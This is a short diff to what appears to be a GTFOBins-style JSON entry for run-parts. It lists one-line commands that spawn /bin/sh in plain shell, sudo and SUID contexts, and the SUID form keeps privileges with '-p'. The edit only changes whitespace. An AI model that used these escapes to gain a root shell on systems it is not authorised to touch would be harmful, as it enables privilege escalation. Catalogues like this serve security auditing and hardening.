@@ -2,17 +2,20 @@
   "functions": {
     "shell": [
       {
-        "code": "run-parts --new-session --regex '^sh$' /bin"
+        
+        "code": "run-parts --new-session --regex '^sh$' /bin\n"
       }
     ],
     "sudo": [
       {
-        "code": "sudo run-parts --new-session --regex '^sh$' /bin"
+        
+        "code": "sudo run-parts --new-session --regex '^sh$' /bin\n"
       }
     ],
     "suid": [
       {
-        "code": "./run-parts --new-session --regex '^sh$' /bin --arg='-p'"
+        
+        "code": "./run-parts --new-session --regex '^sh$' /bin --arg='-p'\n"
       }
     ]
   }
